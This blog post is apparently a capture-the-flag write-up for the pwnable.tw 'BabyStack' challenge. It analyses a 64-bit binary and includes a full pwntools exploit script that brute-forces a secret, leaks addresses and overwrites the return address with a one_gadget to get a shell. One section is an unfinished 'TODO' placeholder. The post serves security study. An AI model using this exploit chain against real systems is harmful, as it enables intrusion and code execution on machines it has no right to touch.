---
layout: post
title: "Pwnable.tw - BabyStack"
date: 2025-02-15 21:59:45 +0300
categories: jekyll update
---

**Contents**
* TOC
{:toc}
## BabyStack 

*Can you find the password in the stack?*

```bash
$ checksec ./babystack
[*] '/home/itay/projects/pwnable_tw/babystack/babystack'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    FORTIFY:    Enabled

$ file ./babystack
./babystack: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, stripped
```

Full mitigations, 64-bit binary.

## Setup

I've first inspected the glibc version of the attached file:

```bash
$ strings ./libc_64.so.6 | grep GNU
GNU C Library (Ubuntu GLIBC 2.23-0ubuntu5) stable release version 2.23, by Roland McGrath et al.
```

I've fetched the corresponding `ld-2.23.so` version (for 64-bit):

```bash
# from https://launchpad.net/ubuntu/xenial/amd64/libc6/2.23-0ubuntu5
wget https://launchpad.net/ubuntu/+source/glibc/2.23-0ubuntu5/+build/11213401/+files/libc6_2.23-0ubuntu5_amd64.deb
```

And run `patchelf` to mimic the remote environment accurately. 

## Overview

Simple menu-based challenge. 

1. 16 random bytes are being stored on both `main`'s local stack frame, and the `.bss`. They are read from `/dev/urandom`, and the fd is stored on the `.bss` for some reason. These bytes are served as the "secret password"

2. There's a login handler, that initializes `is_login_ok` `.bss` variable. This variable seems to be 4-bytes long, yet it overlaps with another byte that is used during the ELF's termination - as it is called from the `.fini_array`. By carefully reading the usage of this variable (`0x202017`), I've seen only its address is being used, not its value. Hence, its value is irrelevant:

```c
result = (__int64 (**)(void))(&unk_202017 - (_UNKNOWN *)&_bss_start);
  if ( (unsigned __int64)(&unk_202017 - (_UNKNOWN *)&_bss_start) > 0xE )
  {
    result = &ITM_deregisterTMCloneTable;
    ...
  }
```

3. The login handler reads `0x7f` bytes into `0x80` **uninitialized** bytes buffer. There's a clear vuln that this local stack buffer isn't initialized. 

4. Moreover, it compares the read bytes from the user to the randomized password. It does so by calculating `n = strlen(s)` amount of bytes, and comparing them. Of course, there's a vuln here, as we can set the first byte of the input as `\x00`, making `strlen` to return `0`, comparing no bytes at all - and passing the `login_ok` check.

5. In addition, there's an OOB-read vuln within `strncmp` usage - recall the `rand_bytes` buffer is only of size `0x10` bytes long, and we actually compare `n` amount of bytes. This means that we can query bytes past the `rand_bytes` buffer, as the `login` handler doesn't crashes upon a failure. 

6. Upon logging in successfully, we can invoke the `copy` handler. It receives `0x40` bytes uninitialized buffer, allocated within `main`'s frame. It then reads `0x3f` bytes into `0x80` bytes uninitialized buffer, allocated within `copy`'s frame. It then performs a simple `strcpy` operation between the local buffer as the source to the destination buffer. Of course, there's a vuln here, as the local `src` buffer may be uninitialized. Indeed, we can control its content using `login`'s buf-reading operation. 

## Exploitation

The bug is pretty straightforward - the `strcpy` from `src` to `dst` is performed until a null byte is found within the source. Since we (almost) fully control the `src` buffer to arbitrary content, we obtain linear-stack overflow primitive, of up to `0x40` bytes. \
My exploitation route is simple: obtain leaks, perform ROP. \
Having this stack write primitive, the ROP part is trivial. However, we have to obtain leak of the canary, libc (for gadgets), and possibly PIE. The reason we'd probably need PIE leak, is because the end of the program verifies that the expected secret password haven't changed, and matches the `.bss` value (which we might be able to read). Since we overwrite a buffer within `main`'s frame, only upon exiting `main` the ROP chain would be triggered. Hence, we must leak the expected password before performing the last overwrite. \
Also notice that we're running within infinite loop, possibly executing the vuln as many times as we wish. 

### Write Primitive

Linear stack overflow of `main`'s local frame, up to `0x40` bytes. That is it. 

### Read Primitive

This is where the actual challenge starts. 
There are no leaks at all, and we don't have lots of logic we can play with in here. \
Hence, my main idea is to utilize the OOB-R vuln of `strncmp`. 

Recall we're overwriting `main`'s frame stack content. 
Due to the corrupting `strcpy` operation, the stack of the destination buffer looks as follows. \
Before:

```bash
pwndbg> x/50gx $rdi
0x7fffd9c73dd0: 0x0000000000000001      0x00007fffd9c73e50
0x7fffd9c73de0: 0x00007d8db5827168      0x0000000000f0b6ff
0x7fffd9c73df0: 0x0000000000000001      0x00006104d90010ad
0x7fffd9c73e00: 0x00007fffd9c73e2e      0x0000000000000000
0x7fffd9c73e10: 0xb8032f16693ba789      0x02a8170e8d320fc4
0x7fffd9c73e20: 0x00007fffd9c70a33      0x0000000000000000
0x7fffd9c73e30: 0x00006104d9001060      0x00007d8db5220830
0x7fffd9c73e40: 0x0000000000000001      0x00007fffd9c73f18
0x7fffd9c73e50: 0x00000001b5825ca0      0x00006104d9000ecf
```

After:

```bash
0x7fffd9c73dd0: 0x4242424242424242      0x4242424242424242
0x7fffd9c73de0: 0x4242424242424242      0x4242424242424242
0x7fffd9c73df0: 0x4242424242424242      0x4242424242424242
0x7fffd9c73e00: 0x4242424242424242      0x4142424242424242
0x7fffd9c73e10: 0x4141414141414141      0x4141414141414141
0x7fffd9c73e20: 0x4141414141414141      0x4141414141414141
0x7fffd9c73e30: 0x4141414141414141      0x4141414141414141
0x7fffd9c73e40: 0x4141414141414141      0x0041414141414141
0x7fffd9c73e50: 0x00000001b5825ca0      0x00006104d9000ecf
```

Recall `main`'s legitimate buffer is of size `0x40` bytes. In the example, it starts within `0x7fffd9c73dd0`, and filled with `\x42`s, except for the last byte, which is `\x41`. \
Right after this buffer, originaly there were the `0x10` randomized bytes of `rand_bytes`, and after them - the `0x10` bytes `input` buffer. \
As we can see, since we've sent `"3\n"` to the input buffer, its LSbs contains `0x0a33`. Interestingly, it seems to overlap with some pre-existing stack address - which makes sense, as the `input` buffer wasn't initialized at all (vuln). \
Moreover, the stack also contains PIE address at `0x7fffd9c73e30`, and libc address at `0x7fffd9c73e38`. 
The PIE address meaning is the RA of `init` (which invokes the init handlers), and libc address meaning is the RA to return to within `__libc_start_main`. \
Hence, overwriting `init` probably won't help us as long as we won't issue `_start` once again - but we can obtain jump primitive by overwriting `__libc_start_main`. 

Funny idea - we can overwrite all bytes until the PIE address leak (`0x7fffd9c73e30`), to some known value. Then, we can guess bytes, one at a time, using the `strncmp`. If we success, `login_ok` should be printed. Otherwise, we'd get a failure message. It would take about ~128 tries for each byte, and there are ~4 randomized byte for each PIE, libc address. This means an average of ~512 tries (and none of them crashes the program). While it is completely decent amount of tries locally, for the remote it might be challenging. Hence, we'd have to batch network requests. \
We can leak the `rand_bytes` solely using `login`, and its non-crashing behavior. We'd start by sending a single byte, until the check is passed.  \
The following script does exactly this:

```python
def leak(p, n, prefix_bytes=b''):
    buf = b''
    leaked_bytes = prefix_bytes
    # Notice - we assume we have no '\x00' within the password.
    # Otherwise, we would have no way to gain indicative knowledge regarding the preceding bytes.
    # The same holds for b'\n', as it is converted to a nullbyte by the reading function.
    invalid_bytes = [0, 10]
    while True:
        for num in range(256):
            if num in invalid_bytes:
                continue
            buf = leaked_bytes + num.to_bytes(1, 'little')
            login_data = login(p, buf + b'\x00')   
            if b'Login Success !' in login_data:
                log.info(f'Found new byte: {hex(num)}')
                logout(p)
                leaked_bytes = buf
                if len(leaked_bytes) == n + len(prefix_bytes):
                    return leaked_bytes
                break
```

Also notice - it seems as there's no stack canary we overwrite within `main` frame, which is wierd. 
Indeed, by inspecting `main` frame carefully, we can see `__stack_chk_fail` is invoked incase `memcmp` of the 16-rand-bytes is failed. \
I've used the `leak` method I've wrote, in order to leak the `password`, as well as `stack_leak` pretty trivially 
(just filling the expected `prefix_bytes` with the bytes of the password). \
However, notice `strncmp` is stopped upon encountering a null byte. This means that in order to leak `pie` address, 
we have to fill the preceding bytes with characters. 
But recall the `0x10` bytes at `0x7fffd9c73e20` are the `input` option-parsing buffer, which we can control. 
Hence, we can fill this buffer, and leak the pie address. \
The challenge is to leak the `libc` address, 8 bytes after it. 
While we can use the `strcpy` vuln in order to overwrite the pie leak within `b'A' * 8`, 
it would always insert an ending `b'\x00'` - truncating the `strncmp` read. \
This means we have to think about some trick here. 

#### Idea 1 - small ROP stager 

Recall we're having both stack and pie leaks at this point. \
Hence, we can perform a small ROP chain - that only calls `puts` with a single argument, and returns back to `main`. 
Of course, the problem is that we can only overwrite `3 * qword` past the RA, 
which is insufficient for such ROP chain (as it also needs to load `rdi`). \
Therefore, my idea was to jump into a `leave; ret` gadget, which exists within the program space. 
By doing so, I can pivot the stack to a controlled address, such as the `login`'s local buffer - which contains arbitrary `0x80` bytes on the stack! \
This means we could use it as a stager towards our ROP chain. \
However, there are 2 major caveats with this approach:

1. Current approach is statistic, as the stack leakage nibble isn't known (and it is randomized). This is because we overwrite the `LSB` of the `input` buffer with `1`. Hence, this approach would have success ratio of only `1/16`.

2. Overwriting both `rbp` and its preceding `ra` isn't trivial - because both of them has nullbytes as their MSBs, after writing the fake `rbp`, the `strcpy` would be truncated, not copying the `ra`. The trick is to start by writing the `ra` (which would leave `8 * b'F'` as `rbp`), and proceed by utilizing the fact that `strcpy` writes a nullbyte as the last byte - and by doing so, write the 2 MSBs of `rbp`. 

The following script implements my idea:

```python
ra_buf = b'A' * 0x40
ra_buf += prefix_bytes
ra_buf += b'F' * 0x8
ra_buf += p64(leave_ret)
stack_overwrite(p, ra_buf)
log.info('overwrote RA')

rbp_buf = b'A' * 0x40
rbp_buf += prefix_bytes
rbp_buf += b'F' * 0x7
stack_overwrite(p, rbp_buf)
log.info(f'overwrote MSB of rbp to nullbyte')

rbp_buf = b'A' * 0x40
rbp_buf += prefix_bytes
rbp_buf += p64(new_rsp)
stack_overwrite(p, rbp_buf)
log.info(f'overwrote rbp')

# Write it within login 
rop_buf = b'K' * 0x78
login(p, rop_buf)
log.info(f'sent rop buf')
```

The end idea is for the ROP to perform libc leakage by calling `puts_plt(puts_got)`, and issuing `read` to halt the program interaction. \
Then, we can restart it, jumping to `main`. \
Because there's already significant time of wait due to the `password` leak, I wouldn't like to add a multiplier of `1/16` success ratio. \
Hence, I've considered a different approach.

#### Idea 2 - libc leak

I've decided that there must a way to leak the `libc` address elegantly. \
I've tried my best leaking `libc` using the pre-existing value within the destination buffer, yet none of it worked (due to `strcpy` writing a nullbyte, stopping the read). 
When I've thought more about this, I decided to try and perform the leak using the source buffer instead. \
In particualr, by inspecting the content of `$rsi` on an uninitalized buffer during `strcpy`, I've seen it contains interesting pointers:

```bash
TODO - add
```

In particular, within offset `0x48` there's a libc leakage. 
This means that if we'd fill the source buffer with exactly `0x48` bytes, the `strcpy` call would leak the extra `libc` pointer to our destination. \
The idea is that we only write small amount of bytes for previous leak, below `0x40` of the local `copy` buffer. 
Hence, the uninitialized content there remains. \
Now, we can utilize the `strncmp` vuln again, comparing bytes one by one - until we figure out the pointer value. \
Notice that by doing so, we've overwrote the first qword of the password with the pad bytes, and the second qword with the libc pointer leak.


### Solution

The following solution works great locally:

```python
#!/usr/bin/python3

from pwn import *

HOST = 'chall.pwnable.tw'
PORT = 10205
context.arch='amd64'
context.os = 'linux'
context.endian = 'little'
BINARY = './babystack'
LIBC = './libc_64.so.6'
LD = './ld-2.23.so'

GDB_SCRIPT = '''
tbreak __libc_start_main
commands
    # p "break copy"
    # b *$rdi - 0xecf + 0xebb
    # commands 
    #     p "gonna strcpy"
    # end

    # p "break login"
    # b *$rdi - 0xecf + 0xe43
    # commands 
    #     p "gonna strncmp"
    # end

    p "break main ret"
    b *$rdi - 0xecf + 0x1052
    commands
        p "in main ret"
    end

    c
end


c
'''

SHELLCODE = '''
.byte 0x00
START:
nop
nop
nop
nop
nop
mov ebx, {0}
xor ecx, ecx
xor edx, edx
push 0x0b
pop eax
int 0x80

BIN_SH:
.ascii "/bin/sh"
.byte 0x00

.rept 26
nop
.endr
jmp START
'''


def unsigned(n, bitness=32):
    if n < 0:
        n = n + 2**bitness
    return n

def pad(buf, alignment, delimiter=b'\x00'):
    if (len(buf) % alignment) == 0:
        return buf

    extra = (alignment - (len(buf) % alignment)) * delimiter
    return buf + extra

def splitted(buf, n):
    for i in range(0, len(buf), n):
        yield buf[i: i + n]

def chunkSize(alloc_size):
    assert(alloc_size >= 0)
    min_size = alloc_size + SIZEOF_PTR
    res = min_size % (2 * SIZEOF_PTR)
    pad = (2 * SIZEOF_PTR) - res if res else 0
    return min_size + pad

def chunkSizeNoFlags(chunk_size):
    if IS_32_BIT:
        result = (chunk_size >> 3) << 3
    else:
        result = (chunk_size >> 4) << 4
    return result 

def maxAllocSize(chunk_size):
    chunk_size = chunkSizeNoFlags(chunk_size)
    return chunk_size - SIZEOF_PTR

def minAllocSize(chunk_size):
    chunk_size = chunkSizeNoFlags(chunk_size)
    return chunk_size - 3 * SIZEOF_PTR + 1

def recvPointer(p):
    leak = p.recv(SIZEOF_PTR)
    assert(len(leak) == SIZEOF_PTR)
    leak = u32(leak)
    assert(leak > 0x10000)
    return leak

###### Constants ######
IS_DEBUG = False 
IS_REMOTE = True
IS_32_BIT = False 
SIZEOF_PTR = 4 if IS_32_BIT else 8
PASSWORD_LENGTH = 0x10

###### Offsets ######

###### Addresses ######
binary = ELF(BINARY)
puts_got = binary.got['puts']
puts_plt = binary.plt['puts']
stack_chk_fail_got = binary.got['__stack_chk_fail']

libc = ELF(LIBC)
bin_sh_libc = next(libc.search(b'/bin/sh'))
system_libc = libc.symbols['system']
puts_libc = libc.symbols['puts']
environ_libc = libc.symbols['environ']

# libc_rop = ROP(LIBC)
# pop_eax_ret = libc_rop.eax.address
# pop_ebx_ret = libc_rop.ebx.address
# pop_ecx_ret = libc_rop.ecx.address
# pop_edx_ret = libc_rop.edx.address
# leave_ret = libc_rop.find_gadget(['leave']).address
# int_80 = libc_rop.find_gadget(['int 0x80']).address

def login(p, buf):
    p.send(b'1')
    p.recvuntil(b'Your passowrd :')
    p.send(buf)
    data = p.recvuntil(b'>> ')
    return data

def logout(p):
    p.send(b'1')
    p.recvuntil(b'>> ')

def copy(p, buf):
    p.send(b'3')
    p.recvuntil(b'Copy :')
    p.send(buf)
    p.recvuntil(b'>> ')

def leak(p, n, prefix_bytes=b''):
    buf = b''
    leaked_bytes = prefix_bytes
    # Notice - we assume we have no '\x00' within the password.
    # Otherwise, we would have no way to gain indicative knowledge regarding the preceding bytes.
    # The same holds for b'\n', as it is converted to a nullbyte by the reading function.
    invalid_bytes = [0, 10]
    while True:
        for num in range(256):
            log.info(f'Trying: {num}')
            if num in invalid_bytes:
                continue
            buf = leaked_bytes + num.to_bytes(1, 'little')
            login_data = login(p, buf + b'\x00')   
            if b'Login Success !' in login_data:
                log.info(f'Found new byte: {hex(num)}')
                logout(p)
                leaked_bytes = buf
                if len(leaked_bytes) == n + len(prefix_bytes):
                    return leaked_bytes
                break

def leak_password(p):
    log.info(f'[leak_password] start')
    password_leak = leak(p, PASSWORD_LENGTH, prefix_bytes = b'')
    return password_leak

def leak_pointer(p, prefix_bytes):
    # We expect 6 bytes of leak, not 8 
    leak_size = SIZEOF_PTR - 2
    leaked_bytes = leak(p, leak_size, prefix_bytes)
    leaked_bytes = leaked_bytes[-leak_size:].ljust(SIZEOF_PTR, b'\x00')
    leaked_bytes = u64(leaked_bytes)
    return leaked_bytes

def fill_input(p, buf):
    p.send(buf)
    p.recvuntil(b'Invalid choice')
    p.recvuntil(b'>> ')
    
def stack_overwrite(p, buf):
    # Set login buffer
    login_buf = b'\x00' + buf[1:]
    login_buf = login_buf.ljust(0x7f, b'\x00')
    login(p, login_buf)
    # Trigger strcpy vuln
    copy_buf = buf[0].to_bytes(1, 'little')
    copy(p, copy_buf)
    logout(p)

def leak_stack(p, password):
    stack_leak = leak_pointer(p, prefix_bytes=password)
    return stack_leak

def leak_libc(p):
    # The problem is that the high bytes of the PIE leak contains 2 '\x00's.
    # While we can overwrite them using the 'copy' vuln, the strcpy would also insert a '\x00' into our libc leak..
    # Hence, the strncmp read would be stopped there. 
    # prefix_bytes += p64(pie_leak)
    # libc_leak = leak_pointer(p, prefix_bytes)
    # log.info(f'libc: {hex(libc_leak)}')
    # Copies libc leak as the second secret password qword, using the vuln. 
    # Utilizes the uninitialized content within 'src'.
    # This overwrite the original secret password.
    login(p, b'\x00' + b'B' * 0x47)
    copy(p, b'B' * 1)
    logout(p)
    prefix_bytes = b'B' * 8  # first password qword
    libc_leak = leak_pointer(p, prefix_bytes)
    libc_base = libc_leak - 0x7a81b
    assert((libc_base & 0xfff) == 0)
    return libc_base 

def leak_pie(p, password, input_buf):
    prefix_bytes = password + b'1' + input_buf[1:]
    pie_leak = leak_pointer(p, prefix_bytes)
    pie_base = pie_leak - 0x1060
    assert(pie_base & 0xfff == 0)
    return pie_base

def write_ra(p, password, input_buf, addr):
    ra_buf = b'A' * 0x40
    ra_buf += password + b'1' + input_buf[1:]
    ra_buf += b'E' * 0x8
    ra_buf += p64(addr)
    stack_overwrite(p, ra_buf)
    
def exploit(p):
    p.recvuntil(b'>> ')
    password = leak_password(p)
    log.info(f'password: {password}')
    
    stack_leak = leak_stack(p, password) 
    log.info(f'stack: {hex(stack_leak)}')
    
    # Allocate bytes, in order to fill the input buffer, preventing its null-bytes from stopping the 'strncmp' read
    input_buf = b'C' * 0x10
    fill_input(p, input_buf)
    
    pie_base = leak_pie(p, password, input_buf) 
    log.info(f'pie_base: {hex(pie_base)}')
   
    libc_base = leak_libc(p)
    log.info(f'libc_base: {hex(libc_base)}')
    
    one_gadget_addr = libc_base + 0xf0567 
    write_ra(p, password, input_buf, one_gadget_addr)
    
    # Before jumping to the one gadget, we must be logged in, 
    login(p, b'\x00')
    # Trigger exit
    p.sendline(b'2')

def main():
    if IS_DEBUG:
        p = gdb.debug(BINARY, gdbscript=GDB_SCRIPT)
    else:
        if IS_REMOTE:
            p = remote(HOST, PORT)
        else:
            p = process(BINARY)

    exploit(p)
    

    log.info('Win')
    p.interactive()

if __name__ == '__main__':
    main()
```

Notice, that the remote server has some very significant RTT, as it is located in taiwan (and the server seems pretty trash). 
While the exploit takes ~1 second locally, every packet request takes about 1 second for the remote server! 
Since we have to leak `0x10` bytes of password, `0x6` bytes of libc, `128` tries on average for each.
This means that the whole leak phase of the exploit takes about `128 * 0x16 = 2816` seconds, or 47 minutes. \
TBH, 1 second locally vs 47 minutes on the remote is prety sick. 


